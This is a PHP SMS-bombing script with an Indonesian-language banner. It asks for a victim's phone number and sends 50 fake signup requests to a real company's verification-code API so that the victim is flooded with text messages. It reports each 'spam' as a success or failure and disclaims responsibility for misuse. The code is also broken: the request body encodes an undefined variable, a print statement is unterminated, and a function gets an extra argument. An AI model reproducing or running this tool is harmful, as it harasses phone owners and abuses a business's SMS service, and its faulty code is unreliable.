<?php
//Nesch7 
//Don't Remove Author Please !

function sms($no){
for ($i=1; $i <= 50; $i++) {
	$t = array("first_name" => "Nesch7", "last_name" => "Programing", "password" => "jsiwbw8wh76", "phone" => $no);

$post = json_encode($p);
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://api.stoqo.com/signup/generate_code/");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_USERAGENT, "okhttp/3.12.0");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json; charset=UTF8'));

$exe = curl_exec($ch);
curl_close($ch);
$js = json_decode($exe);
if (!empty($js->nexmo_request_id)) {
	echo "[=] Spam Berhasil\n";
	}else{
	echo "[-] Spam Gagal Silahkan Mencoba Lagi\n";
}
}
}
print"           `.-://////:-.`                 
	         .:+o+:-..````..-:+o+:.			
           `:o+-`                `:+o:`
         `/o:`                      `:o/`
        -s/`  .-..`            `..--` `/s-
       /o.   `:.`.-:----------:-.``:-   .o/
      /o`    .:`    `              --    `o/
     -s.     .:`                   --     .s-
     o/     .:`    0          0     --     +o
    .s-     :.                      `:`    -s`
    .s.     :.                      `:`    .s.
    .s-     --                      .:     -s.
     o/     `-.       -___        `-.     /o
     -s.     `--`                `.-`     .s-
      /o` ----``..--..`    `...--.`      `o/
       /o. `----`  `-.      `-.         .o/
        -o:  -.......        ..       `:o-
         `:o:``....--        ..     `:o:`
           `:+/-`  `-        ..  `-/+:`
              `-/+///..````..://+/-`
                  `.-::////::-.` 

               [*] Coded By : Nesch7
               [*] Github : https://github.com/Nesch7
               [*] Pembuat Tidak Bertanggung Jawab Jika Tols Disalahgunakan
               [*] Love Programing :) 
      "
echo "Target (Contoh  62123456789 )\nInput : ";
$target = trim(fgets(STDIN));
$execute = sms($target, $t);
print $execute;
print "Eror,Mohon Untuk Menggulangi Tols\n";

// END 

?>
